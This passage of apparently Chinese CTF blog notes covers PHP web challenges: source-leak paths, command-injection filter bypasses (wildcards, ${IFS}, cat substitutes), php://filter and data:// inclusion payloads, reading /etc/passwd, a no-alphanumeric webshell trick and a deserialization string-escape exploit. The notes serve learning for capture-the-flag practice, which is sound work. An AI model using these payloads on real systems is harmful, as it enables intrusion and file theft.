title="0x0c.Baby_PHP_Black"></a>0x0c.Baby_PHP_Black</h1><p>1.传入数组绕过is_numeric()函数，得到baby_magic.php</p><p>2.传入数组绕过php弱类型检测，得到baby_revenge.php</p><p>3.找到sha1碰撞样例，传入得到here_s_the_flag.php</p><p>4.Longlone url二次编码绕过strstr函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(strstr(<span class="hljs-string">&quot;Longlone&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no!&lt;br&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span>)<br>&#123;<br>  <br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag: <span class="hljs-subst">$flag</span>&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow-Web入门</title>
    <link href="/2021/11/01/CTF/web%E5%85%A5%E9%97%A8/"/>
    <url>/2021/11/01/CTF/web%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><span id="more"></span><h6 id="0x01-robots-txt"><a href="#0x01-robots-txt" class="headerlink" title="0x01.robots.txt"></a>0x01.robots.txt</h6><h6 id="0x02-phps源码泄露"><a href="#0x02-phps源码泄露" class="headerlink" title="0x02.phps源码泄露"></a>0x02.phps源码泄露</h6><h6 id="0x03-前端js验证"><a href="#0x03-前端js验证" class="headerlink" title="0x03.前端js验证"></a>0x03.前端js验证</h6><h6 id="0x04-网站源码泄露，直接访问url-www-zip"><a href="#0x04-网站源码泄露，直接访问url-www-zip" class="headerlink" title="0x04.网站源码泄露，直接访问url/www.zip"></a>0x04.网站源码泄露，直接访问url/<a href="http://www.zip/">www.zip</a></h6><h6 id="0x05-git代码泄露，直接访问url-git-index-php"><a href="#0x05-git代码泄露，直接访问url-git-index-php" class="headerlink" title="0x05.git代码泄露，直接访问url/.git/index.php"></a>0x05.git代码泄露，直接访问url/.git/index.php</h6><h6 id="0x06-信息svn泄露-直接访问url-svn"><a href="#0x06-信息svn泄露-直接访问url-svn" class="headerlink" title="0x06.信息svn泄露,直接访问url/.svn/"></a>0x06.信息svn泄露,直接访问url/.svn/</h6><h6 id="0x07-vim缓存信息泄露，直接访问url-index-php-swp"><a href="#0x07-vim缓存信息泄露，直接访问url-index-php-swp" class="headerlink" title="0x07.vim缓存信息泄露，直接访问url/index.php.swp"></a>0x07.vim缓存信息泄露，直接访问url/index.php.swp</h6><h6 id="0x08-cookie，不能存放任何隐私数据"><a href="#0x08-cookie，不能存放任何隐私数据" class="headerlink" title="0x08.cookie，不能存放任何隐私数据"></a>0x08.cookie，不能存放任何隐私数据</h6><h6 id="0x09-DNS解析中-TXT-记录，一般指为某个主机名或域名设置的说明"><a href="#0x09-DNS解析中-TXT-记录，一般指为某个主机名或域名设置的说明" class="headerlink" title="0x09.DNS解析中 TXT 记录，一般指为某个主机名或域名设置的说明"></a>0x09.DNS解析中 TXT 记录，一般指为某个主机名或域名设置的说明</h6><h6 id="0x0a-技术文档中不能出现敏感信息"><a href="#0x0a-技术文档中不能出现敏感信息" class="headerlink" title="0x0a.技术文档中不能出现敏感信息"></a>0x0a.技术文档中不能出现敏感信息</h6><h6 id="0x0b-公开邮箱信息泄露"><a href="#0x0b-公开邮箱信息泄露" class="headerlink" title="0x0b.公开邮箱信息泄露"></a>0x0b.公开邮箱信息泄露</h6><h6 id="0x0c-php探针，对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露"><a href="#0x0c-php探针，对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露" class="headerlink" title="0x0c.php探针，对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露"></a>0x0c.php探针，对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</h6><h6 id="0x0d-view-source-查看网站源码"><a href="#0x0d-view-source-查看网站源码" class="headerlink" title="0x0d.view-source:查看网站源码"></a>0x0d.view-source:查看网站源码</h6><h6 id="0x0e-mdb文件是早期asp-access构架的数据库文件，文件泄露相当于数据库被脱裤了"><a href="#0x0e-mdb文件是早期asp-access构架的数据库文件，文件泄露相当于数据库被脱裤了" class="headerlink" title="0x0e.mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了"></a>0x0e.mdb文件是早期asp+<strong>access</strong>构架的数据库文件，文件泄露相当于数据库被脱裤了</h6><p><a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h6 id="0x00"><a href="#0x00" class="headerlink" title="0x00."></a>0x00.</h6><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h6 id="0x00-通配符绕过"><a href="#0x00-通配符绕过" class="headerlink" title="0x00.通配符绕过"></a>0x00.通配符绕过</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">匹配任何字符串／文本，包括空字符串；*代表任意字符（<span class="hljs-number">0</span>个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意<span class="hljs-number">1</span>个字符 ls file <span class="hljs-number">0</span><br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file <span class="hljs-number">0</span><br><br>反斜杠\对字符转义绕过   <span class="hljs-regexp">//</span>cat fla\g;<br>echo `cat flag`;   <span class="hljs-regexp">//</span>相当于执行system(<span class="hljs-string">&#x27;cat flag&#x27;</span>);<br>?c=include <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;av&quot;</span>]?&gt;&amp;av=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php  <span class="hljs-regexp">//</span>不需要分号<br></code></pre></td></tr></table></figure><h6 id="0x01-命令执行的函数"><a href="#0x01-命令执行的函数" class="headerlink" title="0x01.命令执行的函数"></a>0x01.命令执行的函数</h6><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span> <span class="hljs-title">passthru</span><span class="hljs-params">()</span> <span class="hljs-title">exec</span><span class="hljs-params">()</span> <span class="hljs-title">shell_exec</span><span class="hljs-params">()</span> <span class="hljs-title">popen</span><span class="hljs-params">()</span> <span class="hljs-title">proc_open</span><span class="hljs-params">()</span> <span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span>，只有<span class="hljs-title">system</span><span class="hljs-params">()</span>有回显</span><br></code></pre></td></tr></table></figure><h6 id="0x02-空格绕过"><a href="#0x02-空格绕过" class="headerlink" title="0x02.空格绕过"></a>0x02.空格绕过</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; &lt; &lt;&gt; 重定向符  <span class="hljs-regexp">//</span>&lt;&gt;和?一起使用时没有回显<br>%<span class="hljs-number">09</span>(需要php环境)<br><span class="hljs-variable">$&#123;IFS&#125;</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br>&#123;cat,flag.php&#125; <span class="hljs-regexp">//</span>用逗号实现了空格功能<br>%<span class="hljs-number">20</span><br>%<span class="hljs-number">09</span><br><span class="hljs-regexp">/*123456abc*/</span><br></code></pre></td></tr></table></figure><h6 id="0x03-cat-绕过"><a href="#0x03-cat-绕过" class="headerlink" title="0x03.cat 绕过"></a>0x03.cat 绕过</h6><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">more:</span>一页一页的显示档案内容<br><span class="hljs-symbol">less:</span>与 more 类似<br><span class="hljs-symbol">head:</span>查看头几行<br><span class="hljs-symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br><span class="hljs-symbol">tail:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br><span class="hljs-symbol">od:</span>以二进制的方式读取档案内容<br><span class="hljs-symbol">vi:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">vim:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">sort:</span>可以查看<br><span class="hljs-symbol">uniq:</span>可以查看<br>file -f:报错出具体内容<br></code></pre></td></tr></table></figure><h6 id="0x04-不需要括号的函数"><a href="#0x04-不需要括号的函数" class="headerlink" title="0x04.不需要括号的函数"></a>0x04.不需要括号的函数</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">echo <span class="hljs-number">123</span><span class="hljs-comment">;</span><br>print <span class="hljs-number">123</span><span class="hljs-comment">;</span><br>die<span class="hljs-comment">;</span><br>include <span class="hljs-string">&quot;/etc/passwd&quot;</span><span class="hljs-comment">;</span><br>require <span class="hljs-string">&quot;/etc/passwd&quot;</span><span class="hljs-comment">;</span><br>include_once <span class="hljs-string">&quot;/etc/passwd&quot;</span><span class="hljs-comment">;</span><br>require_once <span class="hljs-string">&quot;etc/passwd&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h6 id="0x05-eval函数闭合特性"><a href="#0x05-eval函数闭合特性" class="headerlink" title="0x05.eval函数闭合特性"></a>0x05.eval函数闭合特性</h6><p><img src="https://i.loli.net/2021/11/02/gzlyYx3Wdsn2kfO.png" alt="img"></p><p>既可以在eval函数中执行关键语句后再拼接php代码的条件</p><h6 id="0x06-文件包含"><a href="#0x06-文件包含" class="headerlink" title="0x06.文件包含"></a>0x06.文件包含</h6><p>文件包含，多利用php伪协议就行文件读取</p><p>data://text/plain,<?php ?></p><p>data://text/plain;base64,<?php ?></p><h6 id="0x07-无参数文件读取"><a href="#0x07-无参数文件读取" class="headerlink" title="0x07.无参数文件读取"></a>0x07.无参数文件读取</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">localeconv<span class="hljs-literal">()</span> 函数返回一包含本地数字及货币格式信息的数组。<br>current<span class="hljs-literal">()</span> 函数返回数组中的当前元素（单元）,默认取第一个值，<br>pos<span class="hljs-literal">()</span> 同 current<span class="hljs-literal">()</span> ,是current<span class="hljs-literal">()</span>的别名<br>reset<span class="hljs-literal">()</span> 函数返回数组第一个单元的值，如果数组为空则返回 FALSE<br><span class="hljs-built_in">array</span><span class="hljs-constructor">_reverse()</span>：数组逆序 scandir<span class="hljs-literal">()</span>：获取目录下的文件<br>next<span class="hljs-literal">()</span>：函数将内部指针指向数组中的下一个元素，并输出。<br><br>print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)));  <span class="hljs-comment">//读取当前目录所有文件名</span><br>highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));<br></code></pre></td></tr></table></figure><p>?c=print_r(scandir(current(localeconv())));</p><h6 id="0x08-php重定向"><a href="#0x08-php重定向" class="headerlink" title="0x08.php重定向"></a>0x08.php重定向</h6><p>******  &gt; /dev/null 2&gt;&amp;1     </p><p>将**字符流或者文件流重定向到null文件(黑洞) ,不进行回显</p><p>具体参考博客cnblogs.com/tinywan/p/6025468.html</p><p>使用如下操作符就行命令分割即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">;<span class="hljs-regexp">//</span>分号 <br>|<span class="hljs-regexp">//</span>只执行后面那条命令 <br>||<span class="hljs-regexp">//</span>只执行前面那条命令 <br>&amp;<span class="hljs-regexp">//</span>两条命令都会执行 <br>&amp;&amp;<span class="hljs-regexp">//</span>两条命令都会执行<br></code></pre></td></tr></table></figure><p>0x09.gerp</p><p>grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p><p>//grep${IFS}’{‘${IFS}fla?.php</p><p>0x0a.P神-无字符数字webshell提高篇</p><p>奉上P神原文链接<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>大体思路是</p><ol><li> POST上传文件会存到   /tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。</li><li>上传php脚本中#!/bin/sh 表示将以sh执行此脚本</li><li>抓包修改参数?c=.%20/???/????????[@-[]     点表示用过当前所指定的shell执行所上传文件中的命令</li></ol><p>0x0a.Bash shell整数运算命令(())</p><p>编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs buma">补码:1.正数的补码为符号位0加原码    //+42的补码为00101010<br>    2.负数的补码为绝对值的补码按位取反+1 //-42的补码为~(00101010)+1=11010101+1=11010110<br>~0=~(0000)=1111=负数 -&gt; 求此负数绝对值 -&gt;  ~(1111-0001)=~(1110)=0001  -&gt; 此负数为-1<br></code></pre></td></tr></table></figure><p>将数学表达式放在((***))中进行运算，多个表达式之间以逗号相隔，以$(())返回最后一个表达式的值</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$((~$(())))   <span class="hljs-comment">//-1</span><br>$((   $((~$(())))   $((~$(())))   ))<br>$((~$(())))==<span class="hljs-number">-1</span> 中间有两个所以是<span class="hljs-number">-2</span> 是相加的 那中间有<span class="hljs-number">37</span>个就是<span class="hljs-number">-37</span><br>构造到<span class="hljs-number">-37</span>取反既是<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>0x0b.函数禁用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">一.换用等价函数<br><span class="hljs-number">1</span>.显示源代码函数<br><span class="hljs-function"><span class="hljs-title">show_source</span><span class="hljs-params">(<span class="hljs-string">&quot;flag.php&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">highlight_file</span><span class="hljs-params">(<span class="hljs-string">&quot;flag.php&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">(<span class="hljs-string">&quot;flag.php&quot;</span>)</span></span><br><span class="hljs-number">2</span>.打印输出函数<br><span class="hljs-function"><span class="hljs-title">echo</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">()</span></span>/print_r()<br><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">var_export</span><span class="hljs-params">()</span></span><br>二.换用其他类型函数<br><span class="hljs-number">1</span>.文件包含函数<br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">include_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require_once</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>0x0c.UAF(use after free)漏洞</p><p>0x0d.Bash内置变量</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@baba</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># echo $&#123;PWD&#125;</span><br>/root<br>root<span class="hljs-variable">@baba</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># echo $&#123;PWD:1:1&#125;   //表示从第2（1+1）个字符开始的一个字符</span><br>r<br>root<span class="hljs-variable">@baba</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># echo $&#123;PWD:0:1&#125;   //表示从第1（0+1）个字符开始的一个字符</span><br>/<br>root<span class="hljs-variable">@baba</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># echo $&#123;PWD:~0:1&#125;  //表示从最后一个字符开始的一个字符</span><br>t<br>root<span class="hljs-variable">@baba</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># echo $&#123;PWD:~A&#125;    //字母代表0</span><br>t<br></code></pre></td></tr></table></figure><p>利用Bash内置变量构造nl命令 </p><p>${PATH:<del>A}${PWD:</del>A} ????.???</p><p>Bash命令，留坑待填…</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h6 id="0x00-php魔术方法"><a href="#0x00-php魔术方法" class="headerlink" title="0x00.php魔术方法"></a>0x00.php魔术方法</h6><table><thead><tr><th>魔术方法</th><th>作用</th></tr></thead><tbody><tr><td>__construct()</td><td>实例化类时自动调用</td></tr><tr><td>__destruct()</td><td>类对象使用结束时自动调用</td></tr><tr><td>__set()</td><td>在给未定义的属性赋值时自动调用</td></tr><tr><td>__get()</td><td>调用未定义的属性时自动调用</td></tr><tr><td>__isset()</td><td>使用 isset() 或 empty() 函数时自动调用</td></tr><tr><td>__unset()</td><td>使用 unset() 时自动调用</td></tr><tr><td>__sleep()</td><td>使用 serialize 序列化时自动调用</td></tr><tr><td>__wakeup()</td><td>使用 unserialize 反序列化时自动调用</td></tr><tr><td>__call()</td><td>调用一个不存在的方法时自动调用</td></tr><tr><td>__callStatic()</td><td>调用一个不存在的静态方法时自动调用</td></tr><tr><td>__toString()</td><td>把对象转换成字符串时自动调用</td></tr><tr><td>__invoke()</td><td>当尝试把对象当方法调用时自动调用</td></tr><tr><td>__set_state()</td><td>当使用 var_export() 函数时自动调用，接受一个数组参数</td></tr><tr><td>__clone()</td><td>当使用 clone 复制一个对象时自动调用</td></tr><tr><td>__debugInfo()</td><td>使用 var_dump() 打印对象信息时自动调用</td></tr></tbody></table><h6 id="0x01-为什么反序列化可以修改原来类的成员变量而不影响反序列化后的结果-困扰了很久"><a href="#0x01-为什么反序列化可以修改原来类的成员变量而不影响反序列化后的结果-困扰了很久" class="headerlink" title="0x01.为什么反序列化可以修改原来类的成员变量而不影响反序列化后的结果(困扰了很久)"></a>0x01.为什么反序列化可以修改原来类的成员变量而不影响反序列化后的结果(困扰了很久)</h6><p>首先php是动态语言，他是一类在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被改进，已有的函数可以被删除或者是其他的结构上的变化。</p><p>可以理解为自己设置的所有变量把原来类中的所有变量覆盖了，但函数没变？。</p><p>0x02.PHP原生类反序列化</p><p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p><p>SoapClient 类反序列化 + CRLF 实现 SSRF，构造请求访问 flag.php 得到 flag</p><h6 id="0x03-反序列化字符串逃逸"><a href="#0x03-反序列化字符串逃逸" class="headerlink" title="0x03.反序列化字符串逃逸"></a>0x03.反序列化字符串逃逸</h6><ol><li><p>php在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾， 同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。</p></li><li><p>php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败</p><p>比如O:4:”test”:1:{s:8:”username”;s:5:”abcdef”;}中username长度与实际不符会报错</p></li><li><p>字符串逃逸多出现在反序列化+字符替换</p></li><li><p>通过替换多出来的字符，构造序列化后的参数，进行参数污染，达到修改参数的目的</p></li></ol><p>以下题为例，利用字符串逃逸将参数user改为admin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$msg</span>));<br>    setcookie(<span class="hljs-string">&#x27;msg&#x27;</span>,base64_encode(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>正常序列化的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$obj</span>=<span class="hljs-keyword">new</span> message(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$obj</span>);<br><span class="hljs-comment">//正常结果</span><br><span class="hljs-comment">//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>带有替换参数的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$obj</span>=<span class="hljs-keyword">new</span> message(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;cfuck&#x27;</span>);<br><span class="hljs-variable">$obj_ser</span>=serialize(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj_rep</span>=str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$obj_ser</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj_rep</span>;<br><span class="hljs-comment">//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:5:&quot;cloveU&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span><br><span class="hljs-comment">//s:5:&quot;cloveU可见序列化后替换字符导致序列化错误</span><br><span class="hljs-comment">//这时候可利用多出来的字符构造&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;来修改参数user</span><br>具体可列方程<br><span class="hljs-variable">$a</span>=strlen(<span class="hljs-string">&#x27;    &quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;    &#x27;</span>);<br>strlen(fuck)*x+<span class="hljs-variable">$a</span>=strlen(loveU)*x  即x=<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$obj</span>=<span class="hljs-keyword">new</span> message(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);<br><span class="hljs-variable">$obj_ser</span>=serialize(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj_rep</span>=str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$obj_ser</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj_rep</span>;<br><span class="hljs-comment">//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span><br>即可修改参数为token=admin<br>    <br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 